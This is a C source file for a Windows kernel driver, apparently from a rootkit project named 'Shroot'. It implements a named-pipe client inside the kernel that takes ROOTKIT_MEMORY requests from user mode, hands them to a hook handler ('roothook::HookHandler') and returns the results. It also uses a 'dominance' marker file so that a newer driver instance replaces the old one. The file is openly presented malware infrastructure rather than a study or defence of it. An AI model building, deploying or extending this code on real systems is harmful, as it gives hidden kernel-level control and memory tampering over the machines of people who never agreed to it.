#include "piping.h"
#pragma warning(disable : 4996)
#pragma warning(disable : 4311)
#pragma warning(disable : 4302)


BOOL DestroyDriver = FALSE;
void ShrootUnload(PDRIVER_OBJECT DriverObject) {
	UNREFERENCED_PARAMETER(DriverObject);
	DestroyDriver = TRUE;
}


NTSTATUS ShowDominanceADD(PCWSTR DomFileName) {
	HANDLE DomHandle = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	UNICODE_STRING FileName = { 0 };
	OBJECT_ATTRIBUTES FileAttr = { 0 };
	IO_STATUS_BLOCK FileStatusBlock = { 0 };
	ULONG IntendedEvil = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;  // 0x56800865;
	LARGE_INTEGER DelayTime = { 0 };
	DelayTime.QuadPart = 2000000000;  // 2 seconds

	RtlInitUnicodeString(&FileName, DomFileName);
	InitializeObjectAttributes(&FileAttr, &FileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	Status = ZwCreateFile(&DomHandle, SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE, &FileAttr, &FileStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, IntendedEvil, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (!NT_SUCCESS(Status) || DomHandle == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver Piping - ShowDominanceADD() failed: 0x%x\n", Status);
		if (DomHandle != NULL) {
			ZwClose(DomHandle);
		}
		return Status;
	}
	ZwClose(DomHandle);
	DbgPrintEx(0, 0, "KMDFdriver Piping - ShowDominanceADD() succeeded\n");
	KeDelayExecutionThread(KernelMode, FALSE, &DelayTime);
	ZwDeleteFile(&FileAttr);
	KeDelayExecutionThread(KernelMode, FALSE, &DelayTime);
	return STATUS_SUCCESS;
}


BOOL ShouldRenewDriverADD(PCWSTR DomFileName, BOOL Silent) {
	HANDLE DomHandle = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	UNICODE_STRING FileName = { 0 };
	OBJECT_ATTRIBUTES FileAttr = { 0 };
	IO_STATUS_BLOCK FileStatusBlock = { 0 };
	ULONG IntendedEvil = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;  // 0x56800865;
	RtlInitUnicodeString(&FileName, DomFileName);
	InitializeObjectAttributes(&FileAttr, &FileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	Status = ZwCreateFile(&DomHandle, SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE, &FileAttr, &FileStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, IntendedEvil, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (!NT_SUCCESS(Status) || DomHandle == NULL) {
		if (!Silent) {
			DbgPrintEx(0, 0, "KMDFdriver Piping - ShouldRenewDriverADD() returned an error, no need to renew (status = 0x%x)\n", Status);
		}
		if (DomHandle != NULL) {
			ZwClose(DomHandle);
		}
		return FALSE;
	}
	DbgPrintEx(0, 0, "KMDFdriver Piping - ShouldRenewDriverADD() did not return an error, more dominant driver exists\n");
	ZwClose(DomHandle);
	return TRUE;
}


NTSTATUS OpenPipe(HANDLE* PipeHandle, POBJECT_ATTRIBUTES PipeNameAttr, PIO_STATUS_BLOCK PipeStatusBlock, BOOL Silent) {
	// Note: returns STATUS_SUCCESS for successful connection, STATUS_OBJECT_NAME_NOT_FOUND for no existing pipe, others for other errors
	NTSTATUS Status = ZwCreateFile(PipeHandle, SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE, PipeNameAttr, PipeStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (!NT_SUCCESS(Status) || *PipeHandle == NULL) {
		if (!Silent) {
			DbgPrintEx(0, 0, "KMDFdriver Piping - OpenPipe() failed with status code 0x%x\n", Status);
		}
		return Status;
	}
	DbgPrintEx(0, 0, "KMDFdriver Piping - OpenPipe() succeeded\n");
	return STATUS_SUCCESS;
}


void ClosePipe(HANDLE* PipeHandle) {
	if (*PipeHandle != NULL) {
		ZwClose(*PipeHandle);
		*PipeHandle = NULL;
	}
}


NTSTATUS WritePipe(HANDLE* PipeHandle, PIO_STATUS_BLOCK PipeStatusBlock, PVOID InputBuffer, SIZE_T BufferSize) {
	if (*PipeHandle != NULL) {
		NTSTATUS Status = ZwWriteFile(*PipeHandle, NULL, NULL, NULL, PipeStatusBlock, InputBuffer, (ULONG)BufferSize, NULL, NULL);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Piping - WritePipe() failed: 0x%x\n", Status);
			return Status;
		}
		if (PipeStatusBlock->Information != BufferSize) {
			DbgPrintEx(0, 0, "KMDFdriver Piping - WritePipe() failed: expected %zu bytes, written only %llu bytes\n", BufferSize, (ULONG64)PipeStatusBlock->Information);
			return STATUS_UNSUCCESSFUL;
		}
	}
	else {
		DbgPrintEx(0, 0, "KMDFdriver Piping - WritePipe() pipe handle is invalid (%d)\n", (DWORD)*PipeHandle);
		return STATUS_INVALID_PARAMETER;
	}
	DbgPrintEx(0, 0, "KMDFdriver Piping - WritePipe() succeeded\n");
	return STATUS_SUCCESS;
}


NTSTATUS ReadPipe(HANDLE* PipeHandle, PIO_STATUS_BLOCK PipeStatusBlock, PVOID OutputBuffer, SIZE_T BufferSize) {
	if (*PipeHandle != NULL) {
		NTSTATUS Status = ZwReadFile(*PipeHandle, NULL, NULL, NULL, PipeStatusBlock, OutputBuffer, (ULONG)BufferSize, NULL, NULL);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Piping - ReadPipe() failed: 0x%x\n", Status);
			return Status;
		}
		if (PipeStatusBlock->Information != BufferSize) {
			DbgPrintEx(0, 0, "KMDFdriver Piping - ReadPipe() failed: expected %zu bytes, read only %llu bytes\n", BufferSize, (ULONG64)PipeStatusBlock->Information);
			return STATUS_UNSUCCESSFUL;
		}
	}
	else {
		DbgPrintEx(0, 0, "KMDFdriver Piping - ReadPipe() pipe handle is invalid (%d)\n", (DWORD)*PipeHandle);
		return STATUS_INVALID_PARAMETER;
	}
	DbgPrintEx(0, 0, "KMDFdriver Piping - ReadPipe() succeeded\n");
	return STATUS_SUCCESS;
}


void PipeClient() {
	HANDLE PipeHandle = NULL;
	PVOID CurrentRequest = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PCWSTR Name = L"\\Device\\NamedPipe\\ShrootPipe";
	PCWSTR DomName = L"\\DosDevices\\C:\\nosusfolder\\verysus\\DriverDominance.txt";
	UNICODE_STRING PipeName = { 0 };
	OBJECT_ATTRIBUTES PipeAttr = { 0 };
	IO_STATUS_BLOCK PipeStatusBlock = { 0 };
	LARGE_INTEGER DelayTime = { 0 };
	DelayTime.QuadPart = 2000000000;  // 2 seconds
	RtlInitUnicodeString(&PipeName, Name);
	InitializeObjectAttributes(&PipeAttr, &PipeName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	ShowDominanceADD(DomName);

	while (!DestroyDriver) {
		// Try to get a handle to the pipe (path not found = pipe not created yet):
		DestroyDriver = ShouldRenewDriverADD(DomName, TRUE);
		if (DestroyDriver) {
			continue;
		}

		Status = OpenPipe(&PipeHandle, &PipeAttr, &PipeStatusBlock, TRUE);
		while (!NT_SUCCESS(Status) && !DestroyDriver) {
			DestroyDriver = ShouldRenewDriverADD(DomName, TRUE);
			if (DestroyDriver) {
				continue;
			}
			KeDelayExecutionThread(KernelMode, FALSE, &DelayTime);
			Status = OpenPipe(&PipeHandle, &PipeAttr, &PipeStatusBlock, TRUE);  // Until pipe is created
		}


		// Get requests again and again until pipe object is not valid anymore:
		while (NT_SUCCESS(Status) && !DestroyDriver) {
			DestroyDriver = ShouldRenewDriverADD(DomName, TRUE);
			if (DestroyDriver) {
				continue;
			}

			CurrentRequest = ExAllocatePoolWithTag(NonPagedPool, sizeof(ROOTKIT_MEMORY), 'PpRb');
			if (CurrentRequest == NULL) {
				Status = STATUS_SUCCESS;
				continue;
			}

			// Get ROOTKIT_MEMORY structure of request:
			Status = ReadPipe(&PipeHandle, &PipeStatusBlock, CurrentRequest, sizeof(ROOTKIT_MEMORY));
			if (!NT_SUCCESS(Status)) {
				if (CurrentRequest != NULL) {
					ExFreePool(CurrentRequest);
					CurrentRequest = NULL;
				}
				continue;
			}

			// Perform request and return results:
			Status = roothook::HookHandler(CurrentRequest);
			Status = WritePipe(&PipeHandle, &PipeStatusBlock, CurrentRequest, sizeof(ROOTKIT_MEMORY));
			if (CurrentRequest != NULL) {
				ExFreePool(CurrentRequest);
				CurrentRequest = NULL;
			}
		}

		// Make sure that pipe is ready to get new connection:
		ClosePipe(&PipeHandle);
	}


	// Clean up everything:
	DbgPrintEx(0, 0, "KMDFdriver Piping - PipeClient() stopped\n");
	if (CurrentRequest != NULL) {
		ExFreePool(CurrentRequest);
		CurrentRequest = NULL;
	}
	//RtlFreeUnicodeString(&PipeName);
	ClosePipe(&PipeHandle);
	DbgPrintEx(0, 0, "KMDFdriver Piping - PipeClient() terminated\n");
}